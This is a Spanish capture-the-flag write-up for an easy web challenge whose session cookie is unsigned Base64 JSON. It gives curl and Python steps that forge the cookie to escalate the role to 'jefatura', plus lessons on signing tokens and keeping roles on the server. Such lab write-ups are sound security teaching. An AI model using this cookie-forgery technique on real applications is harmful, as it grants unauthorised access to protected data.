# Desafío 48 — Credencial digital del personal (cookie sin firma)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / control de acceso basado en el cliente (cookie manipulable) |
| Dificultad | fácil |
| Puntos | 373 (10 soluciones) |
| Objetivo | `http://203.0.113.10:8002` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> Al ingresar un nombre, el sistema emite una credencial de sesión y muestra un panel con el rol. El expediente clasificado solo lo ve la jefatura. ¿Puedes convertirte en jefatura?

Pista en el HTML: `<!-- dev: la credencial viene firmada por el servidor, el cliente no deberia poder alterarla -->`.

## Reconocimiento

- `GET /` → formulario «Nombre del personal». `POST /` responde **302 a `/panel`** y entrega:

  ```
  Set-Cookie: sich_sesion=eyJ1c3VhcmlvIjogImp1YW4iLCAicm9sIjogInZpc2l0YW50ZSIsICJ0b2tlbiI6ICJSWE4wWVNCamNtVmtaVzVqYVdGc0lHNXZJR1Z6ZEdVZ1kybG1jbUZrWVRvZ2MyOXNieUJqYjJScFptbGpZV1JoSUdWdUlHSmhjMlUyTkM0Z1JXd2djbTlzSUdWeklHVmthWFJoWW14bExnPT0ifQ==; Path=/
  Set-Cookie: sich_tema=clinico-claro; Path=/
  ```

- Al decodificar el Base64 de `sich_sesion`:

  ```json
  {"usuario": "juan", "rol": "visitante",
   "token": "RXN0YSBjcmVkZW5jaWFsIG5vIGVzdGUgY2lmcmFkYTogc29sbyBjb2RpZmljYWRhIGVuIGJhc2U2NC4gRWwgcm9sIGVzIGVkaXRhYmxlLg=="}
  ```

  Y el propio `token` (otro Base64) confirma: «**Esta credencial no este cifrada: solo codificada en
  base64. El rol es editable.**»

- `GET /panel` con la credencial legítima:

  ```
  Bienvenido/a, juan. Rol actual: visitante
  Jerarquia de acceso: visitante → clinico → jefatura
  Expediente clasificado :: solo visible para el rol jefatura.
  ```

## Análisis

La credencial **no está firmada**: es JSON en Base64 estándar. El servidor decide el acceso leyendo
el campo `rol` del cookie, que controla el cliente. No hay HMAC, ni JWT, ni sesión del lado del
servidor: la única «protección» es que el nombre del cookie no sea obvio.

Se modificó `rol` y se re-codificó:

```json
{"usuario": "juan", "rol": "jefatura", "token": "…"}
```

Pruebas con distintos valores de `rol`:

| `rol` | Resultado |
|---|---|
| `visitante` | acceso restringido |
| `jefe` | acceso restringido |
| `admin` | acceso restringido |
| `jefatura` | **expediente desbloqueado + flag** (la comparación es insensible a mayúsculas: `JEFATURA` también sirve) |

### Tropiezo de método (importante)

Al forjar el cookie con `requests`, usar `s.get(..., cookies={"sich_sesion": forjado})` **no**
reemplaza el cookie del jar: `requests` envía **ambos** (`sich_sesion=<visitante>; …
sich_sesion=<jefatura>`) y el servidor toma el primero. Hay que limpiar el jar (`s.cookies.clear()`)
o mandar el header `Cookie` a mano. Con `curl -H "Cookie: …"` no ocurre.

## Solución (pasos reproducibles)

```bash
BASE=http://203.0.113.10:8002

# 1) Emitir credencial y ver el contenido
curl -s -D - -o /dev/null -d "usuario=juan" $BASE/ | grep -i sich_sesion
#    (decodificar el Base64: {"usuario":"juan","rol":"visitante",...})

# 2) Forjar rol=jefatura (Base64 del JSON)
FORGED=$(python -c 'import base64,json;print(base64.b64encode(json.dumps({"usuario":"juan","rol":"jefatura","token":""} ).encode()).decode())')

# 3) Reclamar el expediente
curl -s -H "Cookie: sich_sesion=$FORGED" $BASE/panel | grep -o 'cdm{[^}]*}'
```

Automatizado: `python scripts/solve.py` (emite la credencial, decodifica, cambia el rol, reemplaza
el cookie en el jar y extrae la flag).

```text
[*] credencial emitida: {'usuario': 'juan', 'rol': 'visitante', 'token': '...'}
[*] /panel como 'visitante': acceso restringido
[*] credencial forjada: eyJ1c3VhcmlvIjogImp1YW4iLCAicm9sIjogImplZmF0dXJhIiwgInRva2VuIjogIiJ9
[+] FLAG: flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **Base64 no es firma ni cifrado.** Un dato que el cliente puede leer y reescribir no puede ser la
  fuente de verdad para autorizar.
- **Nunca confiar en el rol que envía el cliente.** El rol debe consultarse en el servidor (sesión,
  base de datos) o venir en un token firmado/verificado (JWT con `alg` fijo, cookie de Flask firmada
  con `itsdangerous`, etc.).
- La pista del código («viene firmada por el servidor») era falsa: el token interno del propio
  payload lo delataba.
- **Trampa de herramienta:** cookies duplicadas con el mismo nombre; el servidor puede quedarse con
  la primera. Verificar siempre el header `Cookie` que realmente se envía.
- Evidencia en `evidence/`: inicio, emisión (con `Set-Cookie`), panel de visitante y panel con la
  credencial forjada (rol `jefatura` + flag).
